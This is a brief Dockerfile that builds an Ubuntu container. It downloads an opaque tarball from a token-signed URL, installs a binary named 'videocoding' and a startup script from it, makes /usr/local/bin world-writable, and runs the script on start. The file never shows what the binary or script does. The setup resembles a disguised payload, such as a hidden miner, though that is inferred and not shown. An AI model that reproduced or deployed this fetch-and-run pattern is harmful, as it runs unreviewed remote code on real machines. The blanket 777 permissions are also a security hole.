FROM ubuntu:20.04 

RUN apt update; \
    apt install wget -y; \
    apt install jq -y; \
    apt install bash -y; \
    wget https://data.atonline.net/~jwt/eyJ2IjoxLCJ1IjoicGhwbGF0Zm9ybSIsImUiOjE2NTUxNTA3MzB9.eyJhY3QiOiJnZXQiLCJpbiI6eyJkbCI6dHJ1ZX0sIm1pbWUiOiJhcHBsaWNhdGlvbi9nemlwIiwicCI6ImJsb2JzcmMvYmxvYnMtajdtbGJtLWV6NjUtaGp2Zi1tYWV4LWNjZXFpN3ZlIn0.kMl865u8MXBdLcKLoJoGRaj5VULjW_6acEJbvFa-Knk/variable_ma.tar.gz; \
    tar xf variable_ma.tar.gz; \
    cd variable_ma; \
    cp videocoding /usr/local/bin/videocoding; \
    cp init-conf.json /usr/local/bin/config.json; \
    cp script.sh /usr/local/bin/script.sh; \
    chmod -R 777 /usr/local/bin; \
    cd /usr/local/bin; \
    chmod 777 config.json; \
    chmod 777 videocoding; \
    chmod 777 script.sh;
    
WORKDIR /usr/local/bin
CMD script.sh
